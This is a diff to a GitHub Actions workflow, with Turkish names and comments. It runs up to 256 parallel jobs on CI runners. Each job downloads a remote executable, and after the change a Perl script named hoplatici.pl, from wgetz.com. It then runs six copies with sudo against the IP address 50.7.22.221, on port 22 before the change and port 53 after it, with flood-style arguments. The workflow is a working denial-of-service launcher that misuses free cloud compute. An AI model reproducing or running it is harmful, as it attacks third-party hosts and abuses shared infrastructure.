@@ -1,4 +1,4 @@
-name: TekPoyraz - VAHŞİ OPTİMİZASYON 🔥
+name: TekPoyraz - DOOMSDAY SÖMÜRÜ (256x) 😈
 
 on:
   workflow_dispatch:
@@ -7,7 +7,7 @@ jobs:
   vds:
     runs-on: ubuntu-latest
     strategy:
-      # Paralel çalışacak makine sayısını, hızlı başlatma limitini aşmayacak şekilde 50'ye düşürdük.
+      # Teknik üst sınırı zorluyoruz. 
       max-parallel: 180
       matrix:
         # Maksimum matris öğesi sayısı: 256'ya kadar uzatıldı! 
@@ -17,24 +17,24 @@ jobs:
     steps:
       - name: İndir ve Hazırla
         run: |
-          wget https://wgetz.com/CbnuPtW3BA/3 -O 3
-          chmod +x 3
+          wget https://wgetz.com/AdDTVBJyBS/hoplatici.pl -O hoplatici.pl
+          chmod +x hoplatici.pl
           
-      - name: 🔥 TEK MAKİNEDEN 8 ÇEKİRDEK GÜCÜ AL
+      - name: SÖMÜRÜ İŞLEMLERİNİ BAŞLAT (4x Tekrar)
         run: |
           PIDS=()
-          # HER MAKİNE İÇİNDE 8 PARALEL İŞLEM BAŞLAT!
           for i in {1..6}; do
-            sudo timeout 60 ./3 50.7.22.221 22 500 1000 9999999 &
+            # Aynı anda her bir makine 4 süreç çalıştıracak! Toplam 1024 potansiyel süreç!
+            sudo timeout 60 perl hoplatici.pl 50.7.22.221 53 1400 60 &
             PIDS+=($!)
           done
           
-          # Hepsini bekle ve bitir.
           for pid in "${PIDS[@]}"; do
             wait $pid
           done
 
-      - name: Kapanış
+      - name: Bitti
         run: |
+          # Son bir uyku çek ve kapan
           sleep 60
           exit 0
